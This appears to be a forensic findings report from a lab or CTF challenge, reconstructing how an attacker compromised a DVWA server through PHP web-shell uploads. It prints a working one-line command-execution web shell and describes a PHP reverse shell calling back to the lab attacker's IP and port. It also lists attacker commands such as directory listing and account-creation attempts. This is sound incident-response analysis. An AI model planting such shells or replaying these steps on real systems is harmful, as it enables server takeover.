# Leftovers hunt — attacker-dropped files, tools, and web-shell evidence

Owner: s2cb905 (critic/editor + leftovers seat). All paths below are under the
read-only evidence `inputs/s4a-challenge4` (NTFS volume at sector offset 2048)
or extracts in `work/leftovers/` / `work/extracted/`.

## TL;DR

The box is a Windows Server 2008 SP1 (x86) running XAMPP (Apache 2.4.16 /
PHP 5.6.11 / MySQL / FileZilla) with the deliberately-vulnerable app **DVWA**
(Damn Vulnerable Web Application) at `C:\xampp\htdocs\DVWA`. An attacker from
**192.168.56.102** (Kali Linux — Iceweasel/Firefox on X11 Linux) exploited DVWA
(file-upload + XSS + command-exec via dropped shells) and left behind a set of
PHP web shells and a reverse shell. No separate native dropper binaries
(nc.exe / mimikatz / pwdump / etc.) were found; the attacker operated entirely
through the web shells.

## Attacker identity / origin

- Source IP: **192.168.56.102** (victim is 192.168.56.101, host-only lab net).
  - `work/leftovers/apache-access.log`: 4,404 requests from 192.168.56.102.
  - `work/leftovers/apache-error.log`: `[client 192.168.56.102:51858]` and
    `[client 192.168.56.102:51904]`.
  - Reverse-shell target in `phpshell2.php`: `$ip = '192.168.56.102'; $port = 4545;`.
- User-Agent: `Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
  Firefox/38.0 Iceweasel/38.2.0` → Kali / Debian Linux.

## Dropped web shells (the leftovers)

| # | Path (evidence) | Inode | Size | Type | Created/placed (UTC) |
|---|---|---|---|---|---|
| 1 | `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | 62330-128-3 | 31 B | `<?php system($_GET["cmd"]); ?>` one-liner | 2015-09-03 07:10:15 |
| 2 | `xampp/htdocs/DVWA/webshells.zip` | 62331-128-1 | 42095 B | attacker webshell toolkit ZIP | 2015-09-03 07:14:48 |
| 3 | `xampp/htdocs/DVWA/webshells/` (dir) | 62332-144-1 | — | extraction dir | 2015-09-03 07:14:51 |
| 4 | `xampp/htdocs/DVWA/webshell.php` | 62334-128-1 | 31 B | `<?php system($_GET["cmd"]); ?>` one-liner | 2015-09-03 07:14:57 |
| 5 | `xampp/htdocs/DVWA/c99.php` | 62333-128-3 | 156208 B | c99 shell v1.0 beta (CCTeaM) | 2015-09-03 07:14:51 (NAME) / 07:20:45 (mtime) |
| 6 | `xampp/htdocs/DVWA/hackable/uploads/abc/` (dir) | 62335-144-1 | — | `mkdir abc` via shell | 2015-09-03 07:17:58 |
| 7 | `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | 62337-128-4 | 945 B | PHP reverse shell → 192.168.56.102:4545 | 2015-09-03 07:31:30 |
| 8 | `Users/Administrator/AppData/Local/Temp/c99 (2).php` **(deleted)** | 62338-128-4 | 153275 B | copy of c99 shell (matches zip content) | 2015-09-03 07:20:14 |

Timestamps are MAC times from `work/bodyfile.txt` (`fls -l -m`), converted with
`date -u -r`. Extracted copies and hashes:

- `work/leftovers/webshells.zip` sha256 `bdae3070d4d9a483a8f08db4d16c9100723dea6fba3a7e53cbf249851bad99ee`.
  Contents (python3 `zipfile`): `c99.php` (153275 B, dated 2012-06-09) and
  `webshell.php` (31 B, dated 2014-01-25).
- `work/extracted/c99.php` sha256 `4320d95c...` (156208 B, DVWA root copy).
- `work/extracted/phpshell.php` sha256 `08245eeb...` (31 B).
- `work/extracted/phpshell2.php` sha256 `2e77d2db...` (945 B).

### Shell contents

- `phpshell.php` / `webshell.php`: `<?php system($_GET["cmd"]); ?>` — trivial
  command-execution shell.
- `c99.php`: `c99shell.php v.1.0 beta (21.05.2005) — CCTeaM` — full-featured PHP
  shell (file browser, SQL, command exec, ftp brute, back-connect/NetCat).
- `phpshell2.php`: pentestmonkey-style PHP reverse shell; `eval()` of whatever
  the listener sends; connects to `192.168.56.102:4545`.

## What the attacker did (web-log reconstruction, `work/leftovers/apache-access.log`)

Log times are `-0700`; UTC = +7h. Bodyfile MAC times (UTC) confirm each step.

| UTC time (2015-09-03) | Action (evidence) |
|---|---|
| 07:10:15 | `POST /dvwa/vulnerabilities/upload/` → uploads `phpshell.php` (file mtime 1441264215) |
| 07:14:48 | places `webshells.zip` (crtime 1441264488) |
| 07:14:51–57 | extracts zip → `webshells/`, `webshell.php`, `c99.php` |
| 07:15:58 | `GET /dvwa/hackable/uploads/phpshell.php` (200) — verify shell |
| 07:16:13 | `GET phpshell.php?cmd=dir` — run `dir` |
| 07:17:49 | `GET phpshell.php?cmd=dir%20C:\` — enumerate C:\ |
| 07:17:58 | `GET phpshell.php?cmd=mkdir%20abc` → creates `uploads/abc/` dir |
| 07:19:32 | `GET /dvwa/c99.php` — open c99 shell |
| 07:20:14 | copies c99 to `Temp\c99 (2).php` (now deleted) |
| 07:20:45 | `POST /dvwa/c99.php?act=cmd` — run commands via c99 (two POSTs, ~13 KB/14 KB outputs) |
| 07:31:18–30 | `POST /dvwa/vulnerabilities/upload/` → uploads `phpshell2.php` (reverse shell) |
| 07:31:54 | `GET /dvwa/hackable/uploads/phpshell2.php` → triggers reverse shell to 192.168.56.102:4545 |

Prior recon (Aug 23 – Sep 2): attacker browsed XAMPP dashboard and DVWA, ran
DVWA `setup.php` (created the DB), and exercised XSS (`xss_s`, `xss_r`), SQLi
(`sqli`), and file-include (`fi`) modules — see `work/leftovers/apache-access.log`
and `xampp/php/logs/php_error_log` (extract inode 60477), e.g. `include(../../xampp/phpMyAdmin/config.inc)`.

## Command-execution leftovers

`work/leftovers/apache-error.log` contains command output that the attacker's
shell session produced (captured into the log):

- Three copies of: `The password does not meet the password policy
  requirements ... NET HELPMSG 2245.` → the attacker attempted `net user <name>
  <weak-pass> /add` at least three times and was blocked by password policy.
- `File not found - config.inc` (x2) → attacker tried to read a `config.inc`.

This directly supports Q2 (account creation attempts); the surviving accounts
are in the SAM hive (see s2cb903's registry findings).

## Persistence / tasks / prefetch

- `Windows/System32/Tasks` contains only default Microsoft tasks; no
  attacker-created scheduled task found (source `work/filelist.txt`).
- `Windows/Prefetch` has no entries (server 2008, prefetch not populated).
- No `nc.exe`/`netcat`/`mimikatz`/`pwdump`/`psexec` binaries found on disk
  (source `work/filelist.txt` grep). The reverse shell was pure PHP.

## Bonus — attacker-added directories/files (with proof)

Proof = NTFS MAC times in `work/bodyfile.txt` and web-log correlation; all
timestamps are 2015-09-03 07:10–07:31 UTC, matching the 192.168.56.102 session.

1. `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` (inode 62330) — mtime 1441264215.
2. `xampp/htdocs/DVWA/webshells.zip` (inode 62331) — crtime/mtime 1441264488.
3. `xampp/htdocs/DVWA/webshells/` (inode 62332) — crtime 1441264491.
4. `xampp/htdocs/DVWA/webshell.php` (inode 62334) — mtime 1441264497.
5. `xampp/htdocs/DVWA/c99.php` (inode 62333) — ctime 1441264845.
6. `xampp/htdocs/DVWA/hackable/uploads/abc/` (inode 62335) — crtime 1441264678 (`mkdir abc`).
7. `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` (inode 62337) — mtime 1441265490.
8. `Users/Administrator/AppData/Local/Temp/c99 (2).php` (inode 62338, **deleted**) — mtime 1441264814.

(NB: `c99.php` and `webshell.php` carry old creation timestamps 2012/2014 —
the original timestamps of the files inside `webshells.zip` — consistent with
them being extracted from that toolkit archive.)
